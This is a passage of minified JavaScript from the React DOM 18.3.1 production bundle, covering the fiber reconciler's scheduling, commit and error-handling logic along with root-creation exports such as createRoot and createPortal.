if(t=r&-r,e.callbackPriority!==t){if(null!=n&&Qe(n),1===t)0===e.tag?function(e){_a=!0,za(e)}(oc.bind(null,e)):za(oc.bind(null,e)),sa(function(){0===(6&Al)&&Wa()}),n=null;else{switch(bt(r)){case 1:n=Ze;break;case 4:n=et;break;case 16:default:n=tt;break;case 536870912:n=rt}n=Pc(n,rc.bind(null,e))}e.callbackPriority=t,e.callbackNode=n}}function rc(e,t){if(Xl=-1,Jl=0,0!==(6&Al))throw Error(i(327));var n=e.callbackNode;if(wc()&&e.callbackNode!==n)return null;var r=pt(e,e===Pl?ql:0);if(0===r)return null;if(0!==(30&r)||0!==(r&e.expiredLanes)||t)t=mc(e,r);else{t=r;var a=Al;Al|=2;var s=hc();for(Pl===e&&ql===t||(Wl=null,zl=Xe()+500,dc(e,t));;)try{yc();break}catch(l){pc(e,l)}Ci(),Nl.current=s,Al=a,null!==Tl?t=0:(Pl=null,ql=0,t=Rl)}if(0!==t){if(2===t&&(0!==(a=ft(e))&&(r=a,t=ac(e,a))),1===t)throw n=Ol,dc(e,0),sc(e,r),nc(e,Xe()),n;if(6===t)sc(e,r);else{if(a=e.current.alternate,0===(30&r)&&!function(e){for(var t=e;;){if(16384&t.flags){var n=t.updateQueue;if(null!==n&&null!==(n=n.stores))for(var r=0;r<n.length;r++){var a=n[r],i=a.getSnapshot;a=a.value;try{if(!or(i(),a))return!1}catch(o){return!1}}}if(n=t.child,16384&t.subtreeFlags&&null!==n)n.return=t,t=n;else{if(t===e)break;for(;null===t.sibling;){if(null===t.return||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}(a)&&(2===(t=mc(e,r))&&(0!==(s=ft(e))&&(r=s,t=ac(e,s))),1===t))throw n=Ol,dc(e,0),sc(e,r),nc(e,Xe()),n;switch(e.finishedWork=a,e.finishedLanes=r,t){case 0:case 1:throw Error(i(345));case 2:case 5:bc(e,_l,Wl);break;case 3:if(sc(e,r),(130023424&r)===r&&10<(t=Bl+500-Xe())){if(0!==pt(e,0))break;if(((a=e.suspendedLanes)&r)!==r){Zl(),e.pingedLanes|=e.suspendedLanes&a;break}e.timeoutHandle=ra(bc.bind(null,e,_l,Wl),t);break}bc(e,_l,Wl);break;case 4:if(sc(e,r),(4194240&r)===r)break;for(t=e.eventTimes,a=-1;0<r;){var o=31-st(r);s=1<<o,(o=t[o])>a&&(a=o),r&=~s}if(r=a,10<(r=(120>(r=Xe()-r)?120:480>r?480:1080>r?1080:1920>r?1920:3e3>r?3e3:4320>r?4320:1960*jl(r/1960))-r)){e.timeoutHandle=ra(bc.bind(null,e,_l,Wl),r);break}bc(e,_l,Wl);break;default:throw Error(i(329))}}}return nc(e,Xe()),e.callbackNode===n?rc.bind(null,e):null}function ac(e,t){var n=Dl;return e.current.memoizedState.isDehydrated&&(dc(e,t).flags|=256),2!==(e=mc(e,t))&&(t=_l,_l=n,null!==t&&ic(t)),e}function ic(e){null===_l?_l=e:_l.push.apply(_l,e)}function sc(e,t){for(t&=~Ml,t&=~Il,e.suspendedLanes|=t,e.pingedLanes&=~t,e=e.expirationTimes;0<t;){var n=31-st(t),r=1<<n;e[n]=-1,t&=~r}}function oc(e){if(0!==(6&Al))throw Error(i(327));wc();var t=pt(e,0);if(0===(1&t))return nc(e,Xe()),null;var n=mc(e,t);if(0!==e.tag&&2===n){var r=ft(e);0!==r&&(t=r,n=ac(e,r))}if(1===n)throw n=Ol,dc(e,0),sc(e,t),nc(e,Xe()),n;if(6===n)throw Error(i(345));return e.finishedWork=e.current.alternate,e.finishedLanes=t,bc(e,_l,Wl),nc(e,Xe()),null}function lc(e,t){var n=Al;Al|=1;try{return e(t)}finally{0===(Al=n)&&(zl=Xe()+500,_a&&Wa())}}function cc(e){null!==Gl&&0===Gl.tag&&0===(6&Al)&&wc();var t=Al;Al|=1;var n=Cl.transition,r=xt;try{if(Cl.transition=null,xt=1,e)return e()}finally{xt=r,Cl.transition=n,0===(6&(Al=t))&&Wa()}}function uc(){El=Ll.current,Sa(Ll)}function dc(e,t){e.finishedWork=null,e.finishedLanes=0;var n=e.timeoutHandle;if(-1!==n&&(e.timeoutHandle=-1,aa(n)),null!==Tl)for(n=Tl.return;null!==n;){var r=n;switch(ti(r),r.tag){case 1:null!==(r=r.type.childContextTypes)&&void 0!==r&&Ra();break;case 3:Yi(),Sa(Ta),Sa(Pa),ns();break;case 5:Ji(r);break;case 4:Yi();break;case 13:case 19:Sa(Zi);break;case 10:Ai(r.type._context);break;case 22:case 23:uc()}n=n.return}if(Pl=e,Tl=e=Lc(e.current,null),ql=El=t,Rl=0,Ol=null,Ml=Il=Fl=0,_l=Dl=null,null!==Ei){for(t=0;t<Ei.length;t++)if(null!==(r=(n=Ei[t]).interleaved)){n.interleaved=null;var a=r.next,i=n.pending;if(null!==i){var s=i.next;i.next=a,r.next=s}n.pending=r}Ei=null}return e}function pc(e,t){for(;;){var n=Tl;try{if(Ci(),rs.current=Xs,cs){for(var r=ss.memoizedState;null!==r;){var a=r.queue;null!==a&&(a.pending=null),r=r.next}cs=!1}if(is=0,ls=os=ss=null,us=!1,ds=0,Sl.current=null,null===n||null===n.return){Rl=1,Ol=t,Tl=null;break}e:{var s=e,o=n.return,l=n,c=t;if(t=ql,l.flags|=32768,null!==c&&"object"===typeof c&&"function"===typeof c.then){var u=c,d=l,p=d.tag;if(0===(1&d.mode)&&(0===p||11===p||15===p)){var h=d.alternate;h?(d.updateQueue=h.updateQueue,d.memoizedState=h.memoizedState,d.lanes=h.lanes):(d.updateQueue=null,d.memoizedState=null)}var f=go(o);if(null!==f){f.flags&=-257,yo(f,o,l,0,t),1&f.mode&&mo(s,u,t),c=u;var m=(t=f).updateQueue;if(null===m){var g=new Set;g.add(c),t.updateQueue=g}else m.add(c);break e}if(0===(1&t)){mo(s,u,t),fc();break e}c=Error(i(426))}else if(ai&&1&l.mode){var y=go(o);if(null!==y){0===(65536&y.flags)&&(y.flags|=256),yo(y,o,l,0,t),fi(lo(c,l));break e}}s=c=lo(c,l),4!==Rl&&(Rl=2),null===Dl?Dl=[s]:Dl.push(s),s=o;do{switch(s.tag){case 3:s.flags|=65536,t&=-t,s.lanes|=t,zi(s,ho(0,c,t));break e;case 1:l=c;var v=s.type,x=s.stateNode;if(0===(128&s.flags)&&("function"===typeof v.getDerivedStateFromError||null!==x&&"function"===typeof x.componentDidCatch&&(null===Vl||!Vl.has(x)))){s.flags|=65536,t&=-t,s.lanes|=t,zi(s,fo(s,l,t));break e}}s=s.return}while(null!==s)}xc(n)}catch(b){t=b,Tl===n&&null!==n&&(Tl=n=n.return);continue}break}}function hc(){var e=Nl.current;return Nl.current=Xs,null===e?Xs:e}function fc(){0!==Rl&&3!==Rl&&2!==Rl||(Rl=4),null===Pl||0===(268435455&Fl)&&0===(268435455&Il)||sc(Pl,ql)}function mc(e,t){var n=Al;Al|=2;var r=hc();for(Pl===e&&ql===t||(Wl=null,dc(e,t));;)try{gc();break}catch(a){pc(e,a)}if(Ci(),Al=n,Nl.current=r,null!==Tl)throw Error(i(261));return Pl=null,ql=0,Rl}function gc(){for(;null!==Tl;)vc(Tl)}function yc(){for(;null!==Tl&&!Ke();)vc(Tl)}function vc(e){var t=kl(e.alternate,e,El);e.memoizedProps=e.pendingProps,null===t?xc(e):Tl=t,Sl.current=null}function xc(e){var t=e;do{var n=t.alternate;if(e=t.return,0===(32768&t.flags)){if(null!==(n=$o(n,t,El)))return void(Tl=n)}else{if(null!==(n=Go(n,t)))return n.flags&=32767,void(Tl=n);if(null===e)return Rl=6,void(Tl=null);e.flags|=32768,e.subtreeFlags=0,e.deletions=null}if(null!==(t=t.sibling))return void(Tl=t);Tl=t=e}while(null!==t);0===Rl&&(Rl=5)}function bc(e,t,n){var r=xt,a=Cl.transition;try{Cl.transition=null,xt=1,function(e,t,n,r){do{wc()}while(null!==Gl);if(0!==(6&Al))throw Error(i(327));n=e.finishedWork;var a=e.finishedLanes;if(null===n)return null;if(e.finishedWork=null,e.finishedLanes=0,n===e.current)throw Error(i(177));e.callbackNode=null,e.callbackPriority=0;var s=n.lanes|n.childLanes;if(function(e,t){var n=e.pendingLanes&~t;e.pendingLanes=t,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=t,e.mutableReadLanes&=t,e.entangledLanes&=t,t=e.entanglements;var r=e.eventTimes;for(e=e.expirationTimes;0<n;){var a=31-st(n),i=1<<a;t[a]=0,r[a]=-1,e[a]=-1,n&=~i}}(e,s),e===Pl&&(Tl=Pl=null,ql=0),0===(2064&n.subtreeFlags)&&0===(2064&n.flags)||$l||($l=!0,Pc(tt,function(){return wc(),null})),s=0!==(15990&n.flags),0!==(15990&n.subtreeFlags)||s){s=Cl.transition,Cl.transition=null;var o=xt;xt=1;var l=Al;Al|=4,Sl.current=null,function(e,t){if(ea=Ut,hr(e=pr())){if("selectionStart"in e)var n={start:e.selectionStart,end:e.selectionEnd};else e:{var r=(n=(n=e.ownerDocument)&&n.defaultView||window).getSelection&&n.getSelection();if(r&&0!==r.rangeCount){n=r.anchorNode;var a=r.anchorOffset,s=r.focusNode;r=r.focusOffset;try{n.nodeType,s.nodeType}catch(w){n=null;break e}var o=0,l=-1,c=-1,u=0,d=0,p=e,h=null;t:for(;;){for(var f;p!==n||0!==a&&3!==p.nodeType||(l=o+a),p!==s||0!==r&&3!==p.nodeType||(c=o+r),3===p.nodeType&&(o+=p.nodeValue.length),null!==(f=p.firstChild);)h=p,p=f;for(;;){if(p===e)break t;if(h===n&&++u===a&&(l=o),h===s&&++d===r&&(c=o),null!==(f=p.nextSibling))break;h=(p=h).parentNode}p=f}n=-1===l||-1===c?null:{start:l,end:c}}else n=null}n=n||{start:0,end:0}}else n=null;for(ta={focusedElem:e,selectionRange:n},Ut=!1,Xo=t;null!==Xo;)if(e=(t=Xo).child,0!==(1028&t.subtreeFlags)&&null!==e)e.return=t,Xo=e;else for(;null!==Xo;){t=Xo;try{var m=t.alternate;if(0!==(1024&t.flags))switch(t.tag){case 0:case 11:case 15:case 5:case 6:case 4:case 17:break;case 1:if(null!==m){var g=m.memoizedProps,y=m.memoizedState,v=t.stateNode,x=v.getSnapshotBeforeUpdate(t.elementType===t.type?g:to(t.type,g),y);v.__reactInternalSnapshotBeforeUpdate=x}break;case 3:var b=t.stateNode.containerInfo;1===b.nodeType?b.textContent="":9===b.nodeType&&b.documentElement&&b.removeChild(b.documentElement);break;default:throw Error(i(163))}}catch(w){jc(t,t.return,w)}if(null!==(e=t.sibling)){e.return=t.return,Xo=e;break}Xo=t.return}m=el,el=!1}(e,n),ml(n,e),fr(ta),Ut=!!ea,ta=ea=null,e.current=n,yl(n,e,a),Ye(),Al=l,xt=o,Cl.transition=s}else e.current=n;if($l&&($l=!1,Gl=e,Ql=a),s=e.pendingLanes,0===s&&(Vl=null),function(e){if(it&&"function"===typeof it.onCommitFiberRoot)try{it.onCommitFiberRoot(at,e,void 0,128===(128&e.current.flags))}catch(t){}}(n.stateNode),nc(e,Xe()),null!==t)for(r=e.onRecoverableError,n=0;n<t.length;n++)a=t[n],r(a.value,{componentStack:a.stack,digest:a.digest});if(Hl)throw Hl=!1,e=Ul,Ul=null,e;0!==(1&Ql)&&0!==e.tag&&wc(),s=e.pendingLanes,0!==(1&s)?e===Yl?Kl++:(Kl=0,Yl=e):Kl=0,Wa()}(e,t,n,r)}finally{Cl.transition=a,xt=r}return null}function wc(){if(null!==Gl){var e=bt(Ql),t=Cl.transition,n=xt;try{if(Cl.transition=null,xt=16>e?16:e,null===Gl)var r=!1;else{if(e=Gl,Gl=null,Ql=0,0!==(6&Al))throw Error(i(331));var a=Al;for(Al|=4,Xo=e.current;null!==Xo;){var s=Xo,o=s.child;if(0!==(16&Xo.flags)){var l=s.deletions;if(null!==l){for(var c=0;c<l.length;c++){var u=l[c];for(Xo=u;null!==Xo;){var d=Xo;switch(d.tag){case 0:case 11:case 15:tl(8,d,s)}var p=d.child;if(null!==p)p.return=d,Xo=p;else for(;null!==Xo;){var h=(d=Xo).sibling,f=d.return;if(al(d),d===u){Xo=null;break}if(null!==h){h.return=f,Xo=h;break}Xo=f}}}var m=s.alternate;if(null!==m){var g=m.child;if(null!==g){m.child=null;do{var y=g.sibling;g.sibling=null,g=y}while(null!==g)}}Xo=s}}if(0!==(2064&s.subtreeFlags)&&null!==o)o.return=s,Xo=o;else e:for(;null!==Xo;){if(0!==(2048&(s=Xo).flags))switch(s.tag){case 0:case 11:case 15:tl(9,s,s.return)}var v=s.sibling;if(null!==v){v.return=s.return,Xo=v;break e}Xo=s.return}}var x=e.current;for(Xo=x;null!==Xo;){var b=(o=Xo).child;if(0!==(2064&o.subtreeFlags)&&null!==b)b.return=o,Xo=b;else e:for(o=x;null!==Xo;){if(0!==(2048&(l=Xo).flags))try{switch(l.tag){case 0:case 11:case 15:nl(9,l)}}catch(k){jc(l,l.return,k)}if(l===o){Xo=null;break e}var w=l.sibling;if(null!==w){w.return=l.return,Xo=w;break e}Xo=l.return}}if(Al=a,Wa(),it&&"function"===typeof it.onPostCommitFiberRoot)try{it.onPostCommitFiberRoot(at,e)}catch(k){}r=!0}return r}finally{xt=n,Cl.transition=t}}return!1}function kc(e,t,n){e=_i(e,t=ho(0,t=lo(n,t),1),1),t=Zl(),null!==e&&(yt(e,1,t),nc(e,t))}function jc(e,t,n){if(3===e.tag)kc(e,e,n);else for(;null!==t;){if(3===t.tag){kc(t,e,n);break}if(1===t.tag){var r=t.stateNode;if("function"===typeof t.type.getDerivedStateFromError||"function"===typeof r.componentDidCatch&&(null===Vl||!Vl.has(r))){t=_i(t,e=fo(t,e=lo(n,e),1),1),e=Zl(),null!==t&&(yt(t,1,e),nc(t,e));break}}t=t.return}}function Nc(e,t,n){var r=e.pingCache;null!==r&&r.delete(t),t=Zl(),e.pingedLanes|=e.suspendedLanes&n,Pl===e&&(ql&n)===n&&(4===Rl||3===Rl&&(130023424&ql)===ql&&500>Xe()-Bl?dc(e,0):Ml|=n),nc(e,t)}function Sc(e,t){0===t&&(0===(1&e.mode)?t=1:(t=ut,0===(130023424&(ut<<=1))&&(ut=4194304)));var n=Zl();null!==(e=Oi(e,t))&&(yt(e,t,n),nc(e,n))}function Cc(e){var t=e.memoizedState,n=0;null!==t&&(n=t.retryLane),Sc(e,n)}function Ac(e,t){var n=0;switch(e.tag){case 13:var r=e.stateNode,a=e.memoizedState;null!==a&&(n=a.retryLane);break;case 19:r=e.stateNode;break;default:throw Error(i(314))}null!==r&&r.delete(t),Sc(e,n)}function Pc(e,t){return Ge(e,t)}function Tc(e,t,n,r){this.tag=e,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function qc(e,t,n,r){return new Tc(e,t,n,r)}function Ec(e){return!(!(e=e.prototype)||!e.isReactComponent)}function Lc(e,t){var n=e.alternate;return null===n?((n=qc(e.tag,t,e.key,e.mode)).elementType=e.elementType,n.type=e.type,n.stateNode=e.stateNode,n.alternate=e,e.alternate=n):(n.pendingProps=t,n.type=e.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=14680064&e.flags,n.childLanes=e.childLanes,n.lanes=e.lanes,n.child=e.child,n.memoizedProps=e.memoizedProps,n.memoizedState=e.memoizedState,n.updateQueue=e.updateQueue,t=e.dependencies,n.dependencies=null===t?null:{lanes:t.lanes,firstContext:t.firstContext},n.sibling=e.sibling,n.index=e.index,n.ref=e.ref,n}function Rc(e,t,n,r,a,s){var o=2;if(r=e,"function"===typeof e)Ec(e)&&(o=1);else if("string"===typeof e)o=5;else e:switch(e){case j:return Oc(n.children,a,s,t);case N:o=8,a|=8;break;case S:return(e=qc(12,n,t,2|a)).elementType=S,e.lanes=s,e;case T:return(e=qc(13,n,t,a)).elementType=T,e.lanes=s,e;case q:return(e=qc(19,n,t,a)).elementType=q,e.lanes=s,e;case R:return Fc(n,a,s,t);default:if("object"===typeof e&&null!==e)switch(e.$$typeof){case C:o=10;break e;case A:o=9;break e;case P:o=11;break e;case E:o=14;break e;case L:o=16,r=null;break e}throw Error(i(130,null==e?e:typeof e,""))}return(t=qc(o,n,t,a)).elementType=e,t.type=r,t.lanes=s,t}function Oc(e,t,n,r){return(e=qc(7,e,r,t)).lanes=n,e}function Fc(e,t,n,r){return(e=qc(22,e,r,t)).elementType=R,e.lanes=n,e.stateNode={isHidden:!1},e}function Ic(e,t,n){return(e=qc(6,e,null,t)).lanes=n,e}function Mc(e,t,n){return(t=qc(4,null!==e.children?e.children:[],e.key,t)).lanes=n,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}function Dc(e,t,n,r,a){this.tag=t,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=gt(0),this.expirationTimes=gt(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=gt(0),this.identifierPrefix=r,this.onRecoverableError=a,this.mutableSourceEagerHydrationData=null}function _c(e,t,n,r,a,i,s,o,l){return e=new Dc(e,t,n,o,l),1===t?(t=1,!0===i&&(t|=8)):t=0,i=qc(3,null,null,t),e.current=i,i.stateNode=e,i.memoizedState={element:r,isDehydrated:n,cache:null,transitions:null,pendingSuspenseBoundaries:null},Ii(i),e}function Bc(e){if(!e)return Aa;e:{if(We(e=e._reactInternals)!==e||1!==e.tag)throw Error(i(170));var t=e;do{switch(t.tag){case 3:t=t.stateNode.context;break e;case 1:if(La(t.type)){t=t.stateNode.__reactInternalMemoizedMergedChildContext;break e}}t=t.return}while(null!==t);throw Error(i(171))}if(1===e.tag){var n=e.type;if(La(n))return Fa(e,n,t)}return t}function zc(e,t,n,r,a,i,s,o,l){return(e=_c(n,r,!0,e,0,i,0,o,l)).context=Bc(null),n=e.current,(i=Di(r=Zl(),a=ec(n))).callback=void 0!==t&&null!==t?t:null,_i(n,i,a),e.current.lanes=a,yt(e,a,r),nc(e,r),e}function Wc(e,t,n,r){var a=t.current,i=Zl(),s=ec(a);return n=Bc(n),null===t.context?t.context=n:t.pendingContext=n,(t=Di(i,s)).payload={element:e},null!==(r=void 0===r?null:r)&&(t.callback=r),null!==(e=_i(a,t,s))&&(tc(e,a,s,i),Bi(e,a,s)),s}function Hc(e){return(e=e.current).child?(e.child.tag,e.child.stateNode):null}function Uc(e,t){if(null!==(e=e.memoizedState)&&null!==e.dehydrated){var n=e.retryLane;e.retryLane=0!==n&&n<t?n:t}}function Vc(e,t){Uc(e,t),(e=e.alternate)&&Uc(e,t)}kl=function(e,t,n){if(null!==e)if(e.memoizedProps!==t.pendingProps||Ta.current)xo=!0;else{if(0===(e.lanes&n)&&0===(128&t.flags))return xo=!1,function(e,t,n){switch(t.tag){case 3:To(t),hi();break;case 5:Xi(t);break;case 1:La(t.type)&&Ia(t);break;case 4:Ki(t,t.stateNode.containerInfo);break;case 10:var r=t.type._context,a=t.memoizedProps.value;Ca(ki,r._currentValue),r._currentValue=a;break;case 13:if(null!==(r=t.memoizedState))return null!==r.dehydrated?(Ca(Zi,1&Zi.current),t.flags|=128,null):0!==(n&t.child.childLanes)?Io(e,t,n):(Ca(Zi,1&Zi.current),null!==(e=Ho(e,t,n))?e.sibling:null);Ca(Zi,1&Zi.current);break;case 19:if(r=0!==(n&t.childLanes),0!==(128&e.flags)){if(r)return zo(e,t,n);t.flags|=128}if(null!==(a=t.memoizedState)&&(a.rendering=null,a.tail=null,a.lastEffect=null),Ca(Zi,Zi.current),r)break;return null;case 22:case 23:return t.lanes=0,No(e,t,n)}return Ho(e,t,n)}(e,t,n);xo=0!==(131072&e.flags)}else xo=!1,ai&&0!==(1048576&t.flags)&&Za(t,$a,t.index);switch(t.lanes=0,t.tag){case 2:var r=t.type;Wo(e,t),e=t.pendingProps;var a=Ea(t,Pa.current);Ti(t,n),a=ms(null,t,r,e,a,n);var s=gs();return t.flags|=1,"object"===typeof a&&null!==a&&"function"===typeof a.render&&void 0===a.$$typeof?(t.tag=1,t.memoizedState=null,t.updateQueue=null,La(r)?(s=!0,Ia(t)):s=!1,t.memoizedState=null!==a.state&&void 0!==a.state?a.state:null,Ii(t),a.updater=ro,t.stateNode=a,a._reactInternals=t,oo(t,r,e,n),t=Po(null,t,r,!0,s,n)):(t.tag=0,ai&&s&&ei(t),bo(null,t,a,n),t=t.child),t;case 16:r=t.elementType;e:{switch(Wo(e,t),e=t.pendingProps,r=(a=r._init)(r._payload),t.type=r,a=t.tag=function(e){if("function"===typeof e)return Ec(e)?1:0;if(void 0!==e&&null!==e){if((e=e.$$typeof)===P)return 11;if(e===E)return 14}return 2}(r),e=to(r,e),a){case 0:t=Co(null,t,r,e,n);break e;case 1:t=Ao(null,t,r,e,n);break e;case 11:t=wo(null,t,r,e,n);break e;case 14:t=ko(null,t,r,to(r.type,e),n);break e}throw Error(i(306,r,""))}return t;case 0:return r=t.type,a=t.pendingProps,Co(e,t,r,a=t.elementType===r?a:to(r,a),n);case 1:return r=t.type,a=t.pendingProps,Ao(e,t,r,a=t.elementType===r?a:to(r,a),n);case 3:e:{if(To(t),null===e)throw Error(i(387));r=t.pendingProps,a=(s=t.memoizedState).element,Mi(e,t),Wi(t,r,null,n);var o=t.memoizedState;if(r=o.element,s.isDehydrated){if(s={element:r,isDehydrated:!1,cache:o.cache,pendingSuspenseBoundaries:o.pendingSuspenseBoundaries,transitions:o.transitions},t.updateQueue.baseState=s,t.memoizedState=s,256&t.flags){t=qo(e,t,r,n,a=lo(Error(i(423)),t));break e}if(r!==a){t=qo(e,t,r,n,a=lo(Error(i(424)),t));break e}for(ri=ca(t.stateNode.containerInfo.firstChild),ni=t,ai=!0,ii=null,n=wi(t,null,r,n),t.child=n;n;)n.flags=-3&n.flags|4096,n=n.sibling}else{if(hi(),r===a){t=Ho(e,t,n);break e}bo(e,t,r,n)}t=t.child}return t;case 5:return Xi(t),null===e&&ci(t),r=t.type,a=t.pendingProps,s=null!==e?e.memoizedProps:null,o=a.children,na(r,a)?o=null:null!==s&&na(r,s)&&(t.flags|=32),So(e,t),bo(e,t,o,n),t.child;case 6:return null===e&&ci(t),null;case 13:return Io(e,t,n);case 4:return Ki(t,t.stateNode.containerInfo),r=t.pendingProps,null===e?t.child=bi(t,null,r,n):bo(e,t,r,n),t.child;case 11:return r=t.type,a=t.pendingProps,wo(e,t,r,a=t.elementType===r?a:to(r,a),n);case 7:return bo(e,t,t.pendingProps,n),t.child;case 8:case 12:return bo(e,t,t.pendingProps.children,n),t.child;case 10:e:{if(r=t.type._context,a=t.pendingProps,s=t.memoizedProps,o=a.value,Ca(ki,r._currentValue),r._currentValue=o,null!==s)if(or(s.value,o)){if(s.children===a.children&&!Ta.current){t=Ho(e,t,n);break e}}else for(null!==(s=t.child)&&(s.return=t);null!==s;){var l=s.dependencies;if(null!==l){o=s.child;for(var c=l.firstContext;null!==c;){if(c.context===r){if(1===s.tag){(c=Di(-1,n&-n)).tag=2;var u=s.updateQueue;if(null!==u){var d=(u=u.shared).pending;null===d?c.next=c:(c.next=d.next,d.next=c),u.pending=c}}s.lanes|=n,null!==(c=s.alternate)&&(c.lanes|=n),Pi(s.return,n,t),l.lanes|=n;break}c=c.next}}else if(10===s.tag)o=s.type===t.type?null:s.child;else if(18===s.tag){if(null===(o=s.return))throw Error(i(341));o.lanes|=n,null!==(l=o.alternate)&&(l.lanes|=n),Pi(o,n,t),o=s.sibling}else o=s.child;if(null!==o)o.return=s;else for(o=s;null!==o;){if(o===t){o=null;break}if(null!==(s=o.sibling)){s.return=o.return,o=s;break}o=o.return}s=o}bo(e,t,a.children,n),t=t.child}return t;case 9:return a=t.type,r=t.pendingProps.children,Ti(t,n),r=r(a=qi(a)),t.flags|=1,bo(e,t,r,n),t.child;case 14:return a=to(r=t.type,t.pendingProps),ko(e,t,r,a=to(r.type,a),n);case 15:return jo(e,t,t.type,t.pendingProps,n);case 17:return r=t.type,a=t.pendingProps,a=t.elementType===r?a:to(r,a),Wo(e,t),t.tag=1,La(r)?(e=!0,Ia(t)):e=!1,Ti(t,n),io(t,r,a),oo(t,r,a,n),Po(null,t,r,!0,e,n);case 19:return zo(e,t,n);case 22:return No(e,t,n)}throw Error(i(156,t.tag))};var $c="function"===typeof reportError?reportError:function(e){console.error(e)};function Gc(e){this._internalRoot=e}function Qc(e){this._internalRoot=e}function Kc(e){return!(!e||1!==e.nodeType&&9!==e.nodeType&&11!==e.nodeType)}function Yc(e){return!(!e||1!==e.nodeType&&9!==e.nodeType&&11!==e.nodeType&&(8!==e.nodeType||" react-mount-point-unstable "!==e.nodeValue))}function Xc(){}function Jc(e,t,n,r,a){var i=n._reactRootContainer;if(i){var s=i;if("function"===typeof a){var o=a;a=function(){var e=Hc(s);o.call(e)}}Wc(t,s,e,a)}else s=function(e,t,n,r,a){if(a){if("function"===typeof r){var i=r;r=function(){var e=Hc(s);i.call(e)}}var s=zc(t,r,e,0,null,!1,0,"",Xc);return e._reactRootContainer=s,e[fa]=s.current,Wr(8===e.nodeType?e.parentNode:e),cc(),s}for(;a=e.lastChild;)e.removeChild(a);if("function"===typeof r){var o=r;r=function(){var e=Hc(l);o.call(e)}}var l=_c(e,0,!1,null,0,!1,0,"",Xc);return e._reactRootContainer=l,e[fa]=l.current,Wr(8===e.nodeType?e.parentNode:e),cc(function(){Wc(t,l,n,r)}),l}(n,t,e,a,r);return Hc(s)}Qc.prototype.render=Gc.prototype.render=function(e){var t=this._internalRoot;if(null===t)throw Error(i(409));Wc(e,t,null,null)},Qc.prototype.unmount=Gc.prototype.unmount=function(){var e=this._internalRoot;if(null!==e){this._internalRoot=null;var t=e.containerInfo;cc(function(){Wc(null,e,null,null)}),t[fa]=null}},Qc.prototype.unstable_scheduleHydration=function(e){if(e){var t=Nt();e={blockedOn:null,target:e,priority:t};for(var n=0;n<Rt.length&&0!==t&&t<Rt[n].priority;n++);Rt.splice(n,0,e),0===n&&Mt(e)}},wt=function(e){switch(e.tag){case 3:var t=e.stateNode;if(t.current.memoizedState.isDehydrated){var n=dt(t.pendingLanes);0!==n&&(vt(t,1|n),nc(t,Xe()),0===(6&Al)&&(zl=Xe()+500,Wa()))}break;case 13:cc(function(){var t=Oi(e,1);if(null!==t){var n=Zl();tc(t,e,1,n)}}),Vc(e,1)}},kt=function(e){if(13===e.tag){var t=Oi(e,134217728);if(null!==t)tc(t,e,134217728,Zl());Vc(e,134217728)}},jt=function(e){if(13===e.tag){var t=ec(e),n=Oi(e,t);if(null!==n)tc(n,e,t,Zl());Vc(e,t)}},Nt=function(){return xt},St=function(e,t){var n=xt;try{return xt=e,t()}finally{xt=n}},ke=function(e,t,n){switch(t){case"input":if(J(e,n),t=n.name,"radio"===n.type&&null!=t){for(n=e;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll("input[name="+JSON.stringify(""+t)+'][type="radio"]'),t=0;t<n.length;t++){var r=n[t];if(r!==e&&r.form===e.form){var a=wa(r);if(!a)throw Error(i(90));G(r),J(r,a)}}}break;case"textarea":ie(e,n);break;case"select":null!=(t=n.value)&&ne(e,!!n.multiple,t,!1)}},Pe=lc,Te=cc;var Zc={usingClientEntryPoint:!1,Events:[xa,ba,wa,Ce,Ae,lc]},eu={findFiberByHostInstance:va,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},tu={bundleType:eu.bundleType,version:eu.version,rendererPackageName:eu.rendererPackageName,rendererConfig:eu.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:b.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return null===(e=Ve(e))?null:e.stateNode},findFiberByHostInstance:eu.findFiberByHostInstance||function(){return null},findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if("undefined"!==typeof __REACT_DEVTOOLS_GLOBAL_HOOK__){var nu=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!nu.isDisabled&&nu.supportsFiber)try{at=nu.inject(tu),it=nu}catch(ue){}}t.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Zc,t.createPortal=function(e,t){var n=2<arguments.length&&void 0!==arguments[2]?arguments[2]:null;if(!Kc(t))throw Error(i(200));return function(e,t,n){var r=3<arguments.length&&void 0!==arguments[3]?arguments[3]:null;return{$$typeof:k,key:null==r?null:""+r,children:e,containerInfo:t,implementation:n}}(e,t,null,n)},t.createRoot=function(e,t){if(!Kc(e))throw Error(i(299));var n=!1,r="",a=$c;return null!==t&&void 0!==t&&(!0===t.unstable_strictMode&&(n=!0),void 0!==t.identifierPrefix&&(r=t.identifierPrefix),void 0!==t.onRecoverableError&&(a=t.onRecoverableError)),t=_c(e,1,!1,null,0,n,0,r,a),e[fa]=t.current,Wr(8===e.nodeType?e.parentNode:e),new Gc(t)},t.findDOMNode=function(e){if(null==e)return null;if(1===e.nodeType)return e;var t=e._reactInternals;if(void 0===t){if("function"===typeof e.render)throw Error(i(188));throw e=Object.keys(e).join(","),Error(i(268,e))}return e=null===(e=Ve(t))?null:e.stateNode},t.flushSync=function(e){return cc(e)},t.hydrate=function(e,t,n){if(!Yc(t))throw Error(i(200));return 